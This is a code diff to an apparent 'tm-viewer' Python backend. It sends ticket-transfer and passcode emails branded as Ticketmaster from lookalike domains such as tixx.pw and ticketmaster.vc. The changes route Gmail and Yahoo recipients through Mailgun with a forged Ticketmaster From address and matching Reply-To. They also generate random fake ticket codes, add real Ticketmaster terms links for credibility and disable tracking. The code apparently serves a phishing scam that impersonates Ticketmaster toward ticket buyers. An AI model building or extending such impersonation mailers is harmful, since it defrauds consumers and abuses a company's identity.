@@ -80,13 +80,9 @@ TM_VIEWER_DELIVERIES_JSONL — optional extra JSONL path; **reads merge** this f
 ``STUBBY_BASE_DIR``, and the Windows default path unless ``TM_VIEWER_DELIVERIES_SINGLE_FILE=1``.
 STUBBY_BASE_DIR / TM_VIEWER_STUBBY_BASE_DIR — folder containing ``tm_viewer_deliveries.jsonl``.
 TM_VIEWER_DELIVERIES_PRIMARY — ``1``/``0``/unset; unset = auto (use deliveries if file has data)
-TM_RESEND_FROM — optional mailbox only (e.g. noreply@tixx.pw or Name <addr>); must be verified in Resend.
-    Display name sent to customers is always **Ticketmaster**. Default address: noreply@tixx.pw.
-    **If Gmail still shows another domain (e.g. ticketmaster.vc), this variable is set on the VPS** — unset it or
-    change it to noreply@tixx.pw, then restart stubby or the registry process. On start, this module prints
-    ``[tm-viewer] viewer email outbound: …`` with the address actually used.
-TM_RESEND_API_KEY — optional; overrides built-in key
-**Mailgun (optional):** viewer OTP + buyer-transfer email **defaults to Resend** (tixx.pw). To use Mailgun, set ``TM_VIEWER_EMAIL_PROVIDER=mailgun`` (or ``smtp`` / ``stubby``), plus ``MAILGUN_API_KEY`` + ``MAILGUN_DOMAIN`` and optional ``MAILGUN_FROM`` / ``TM_MAILGUN_FROM``, or ``smtp/mailgun_sender.py`` with credentials.
+TM_RESEND_FROM — optional Resend From (default noreply@tixx.pw). Used for non-gmail/yahoo in split mode.
+TM_RESEND_API_KEY — required for Resend sends (non-gmail/yahoo by default).
+**Email routing (default split):** ``@gmail.com`` / ``@googlemail.com`` / Yahoo domains → **Mailgun** (``SMTP/mailgun_sender.py`` or ``MAILGUN_API_KEY`` + ``MAILGUN_DOMAIN``, From ``Ticketmaster <noreply@ticketmaster.com>``). All other domains → **Resend**. Override: ``TM_VIEWER_EMAIL_PROVIDER=mailgun`` (all Mailgun) or ``resend`` (all Resend). Mailgun From override: ``MAILGUN_FROM`` / ``TM_MAILGUN_FROM``.
 **Debug:** ``TM_VIEWER_API_DEBUG=1`` logs every POST path to stdout (see why Vercel proxy path does not match).
 **Stubby:** ``STUBBY_START_TM_VIEWER_API=1`` starts this HTTP API in a background thread when stubby launches (default host ``0.0.0.0``, port ``TM_VIEWER_API_PORT`` or ``3919``).
     Then point Vercel ``TM_VIEWER_BACKEND_URL`` at ``http://74.0.48.168:3919`` (no ``/api`` suffix; same host as registry).
@@ -94,7 +90,7 @@ TM_TRANSFER_EMAIL_TEMPLATE — optional explicit path to ``ticketmaster_template
 ``smtp/ticketmaster_template.html`` or ``SMTP/ticketmaster_template.html`` under (in order) ``TM_VIEWER_SMTP_DIR`` /
 ``STUBBY_SMTP_DIR``, the **registry JSON parent folder** (e.g. ``tm.bz/smtp/`` next to ``tm_viewer_link_registry.json``),
 ``cwd``, then this script’s folder — same layout as stubby’s SMTP bundle.
-Having ``smtp/mailgun_sender.py`` on disk does **not** switch the viewer to Mailgun; set ``TM_VIEWER_EMAIL_PROVIDER=mailgun`` if you need Mailgun.
+Having ``smtp/mailgun_sender.py`` on disk supplies Mailgun credentials automatically when the registry starts (same layout as stubby).
 TM_VIEWER_SESSIONS_PATH — optional JSON file for login sessions (default: tm_viewer_sessions.json next to registry).
     **Required for stable logins:** without a writable sessions file, every API restart drops all tokens; the browser
     still had localStorage but GET /api/tm-viewer/tickets returns auth_required (looks like a random logout).
@@ -2699,7 +2695,9 @@ def _load_smtp_mailgun_config() -> tuple[str, str, str] | None:
     k = str(getattr(mod, "MAILGUN_API_KEY", "") or "").strip()
     dom = str(getattr(mod, "MAILGUN_DOMAIN", "") or "").strip()
     fr = str(getattr(mod, "DEFAULT_FROM_EMAIL", "") or "").strip()
-    if k and dom and fr:
+    if k and dom:
+        if not fr:
+            fr = _mailgun_from_line()
         return k, dom, fr
     return None
 
@@ -3591,8 +3589,20 @@ def _build_buyer_transfer_email_html(
     seat = str(ticket.get("seat") or "TBA")
     ticket_code = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(12))
     rec = (recipient_label or "").strip() or "Customer"
+    from_n = (personal_from_name or "").strip() or "Chris"
+    seat_line_parts: list[str] = []
+    if section and section.upper() != "TBA":
+        seat_line_parts.append(f"Section {section}")
+    if row and row.upper() != "TBA":
+        seat_line_parts.append(f"Row {row}")
+    if seat and seat.upper() != "TBA":
+        seat_line_parts.append(f"Seat {seat}")
+    seat_line = ", ".join(seat_line_parts) if seat_line_parts else "General Admission"
+    event_image = str(
+        ticket.get("event_image") or ticket.get("image_url") or ticket.get("hero_image") or ""
+    ).strip() or "https://i.postimg.cc/vTsN6hmz/event-image.png"
     replacements = {
-        "{{senderName}}": "Ticketmaster",
+        "{{senderName}}": escape(from_n),
         "{{recipientName}}": escape(rec),
         "{{artistName}}": escape(event_name),
         "{{eventDate}}": escape(event_date),
@@ -3600,40 +3610,64 @@ def _build_buyer_transfer_email_html(
         "{{section}}": escape(section),
         "{{row}}": escape(row),
         "{{seat}}": escape(seat),
+        "{{seatLine}}": escape(seat_line),
         "{{acceptLink}}": pass_url,
         "{{ticketCode}}": ticket_code,
         "{{termsLink}}": "https://www.ticketmaster.com/h/terms.html",
         "{{privacyLink}}": "https://privacy.ticketmaster.com/policy.html",
+        "{{eventImage}}": event_image,
     }
     if "{{ticketCountN}}" in template:
-        replacements["{{ticketCountN}}"] = "1"
+        replacements["{{ticketCountN}}"] = str(ticket.get("ticket_count_n") or 1)
     body = template
     for k, v in replacements.items():
         body = body.replace(k, str(v))
-    if msg:
-        from_n_plain = (personal_from_name or "").strip() or "Chris"
-        subj = f"Your Ticket Transfer From {from_n_plain} Is Ready To Be Accepted!"
-    else:
-        subj = "Your Ticket Transfer From Ticketmaster Is Ready To Be Accepted!"
+    subj = f"{from_n} sent you ticket(s) for {event_name}"
     return subj, body
 
 
-def _viewer_outbound_uses_mailgun() -> bool:
-    """Mailgun only when TM_VIEWER_EMAIL_PROVIDER opts in (default outbound is Resend)."""
-    prov = (os.environ.get("TM_VIEWER_EMAIL_PROVIDER") or "").strip().lower()
-    if prov in ("mailgun", "smtp", "stubby"):
-        return True
-    if prov == "resend":
+def _viewer_email_provider_mode() -> str:
+    """split (default), mailgun, or resend."""
+    return (os.environ.get("TM_VIEWER_EMAIL_PROVIDER") or "split").strip().lower()
+
+
+def _recipient_domain_uses_mailgun(to_email: str) -> bool:
+    """Gmail + Yahoo inboxes → Mailgun (Ticketmaster From); everything else → Resend."""
+    em_norm = _normalize_email(to_email)
+    if "@" not in em_norm:
         return False
+    domain = em_norm.rsplit("@", 1)[-1].lower()
+    if domain in ("gmail.com", "googlemail.com"):
+        return True
+    if domain.startswith("yahoo.") or domain in ("ymail.com", "rocketmail.com"):
+        return True
     return False
+
+
+def _viewer_outbound_uses_mailgun_for(to_email: str) -> bool:
+    mode = _viewer_email_provider_mode()
+    if mode == "resend":
+        return False
+    if mode == "mailgun":
+        return True
+    return _recipient_domain_uses_mailgun(to_email)
 
 
 def _mailgun_from_line() -> str:
     raw = (os.environ.get("MAILGUN_FROM") or os.environ.get("TM_MAILGUN_FROM") or "").strip()
     if raw:
         return raw
-    # Match stubby-style Ticketmaster branding; mailbox must be allowed on the Mailgun domain.
-    return "Ticketmaster <noreply@ticketmaster.com>"
+    return "Ticketmaster <customer_support@email.ticketmaster.com>"
+
+
+def _html_to_plain_email(subject: str, html_body: str) -> str:
+    text = re.sub(r"(?is)<(script|style)[^>]*>.*?</\1>", " ", html_body)
+    text = re.sub(r"(?is)<br\s*/?>", "\n", text)
+    text = re.sub(r"(?is)</p>", "\n\n", text)
+    text = re.sub(r"<[^>]+>", " ", text)
+    text = unescape(re.sub(r"[ \t\r\f\v]+", " ", text))
+    text = re.sub(r"\n{3,}", "\n\n", text).strip()
+    return f"{subject}\n\n{text[:5000]}\n"
 
 
 def _send_mailgun_html_email(to_email: str, subject: str, html_body: str) -> tuple[bool, str]:
@@ -3650,14 +3684,24 @@ def _send_mailgun_html_email(to_email: str, subject: str, html_body: str) -> tup
     if not key or not domain:
         return False, "Mailgun: add smtp/mailgun_sender.py (stubby layout) or set MAILGUN_API_KEY + MAILGUN_DOMAIN"
     url = f"https://api.mailgun.net/v3/{domain}/messages"
-    data = urllib.parse.urlencode(
-        {
-            "from": from_line,
-            "to": em_norm,
-            "subject": subject,
-            "html": html_body,
-        }
-    ).encode("utf-8")
+    payload = {
+        "from": from_line,
+        "to": em_norm,
+        "subject": subject,
+        "html": html_body,
+        "text": _html_to_plain_email(subject, html_body),
+        "o:tracking": "no",
+        "o:tracking-clicks": "no",
+        "o:tracking-opens": "no",
+    }
+    reply_to = (os.environ.get("MAILGUN_REPLY_TO") or "").strip()
+    if not reply_to and "@" in from_line:
+        m = re.search(r"<([^<>]+)>", from_line)
+        if m:
+            reply_to = m.group(1).strip()
+    if reply_to:
+        payload["h:Reply-To"] = reply_to
+    data = urllib.parse.urlencode(payload).encode("utf-8")
     auth = base64.b64encode(f"api:{key}".encode("utf-8")).decode("ascii")
     req = urllib.request.Request(
         url,
@@ -3684,8 +3728,8 @@ def _send_mailgun_html_email(to_email: str, subject: str, html_body: str) -> tup
 
 
 def _send_viewer_html_email(to_email: str, subject: str, html_body: str) -> tuple[bool, str]:
-    """OTP + buyer transfer: Resend by default; Mailgun only if TM_VIEWER_EMAIL_PROVIDER=mailgun (or smtp/stubby)."""
-    if _viewer_outbound_uses_mailgun():
+    """OTP + buyer transfer: split default — gmail/yahoo→Mailgun, other domains→Resend."""
+    if _viewer_outbound_uses_mailgun_for(to_email):
         return _send_mailgun_html_email(to_email, subject, html_body)
     return _send_resend_html_email(to_email, subject, html_body)
 
@@ -3778,15 +3822,18 @@ def _resend_from() -> str:
 
 
 def _log_viewer_outbound_email_from_banner() -> None:
-    """Print once at API start: real From line (TM_RESEND_FROM overrides default noreply@tixx.pw)."""
-    if _viewer_outbound_uses_mailgun():
-        cfg = _load_smtp_mailgun_config()
-        if cfg:
-            detail = f"mailgun (smtp/mailgun_sender.py) {cfg[2]}"
-        else:
-            detail = f"mailgun {_mailgun_from_line()}"
+    """Print once at API start: routing mode + From lines."""
+    mode = _viewer_email_provider_mode()
+    cfg = _load_smtp_mailgun_config()
+    mg_from = cfg[2] if cfg else _mailgun_from_line()
+    rs_from = _resend_from()
+    if mode == "resend":
+        detail = f"resend only {rs_from}"
+    elif mode == "mailgun":
+        src = "smtp/mailgun_sender.py" if cfg else "MAILGUN_*"
+        detail = f"mailgun only ({src}) {mg_from}"
     else:
-        detail = f"resend {_resend_from()}"
+        detail = f"split gmail/yahoo→mailgun {mg_from} | others→resend {rs_from}"
     print(f"[tm-viewer] viewer email outbound: {detail}", flush=True)
 
 
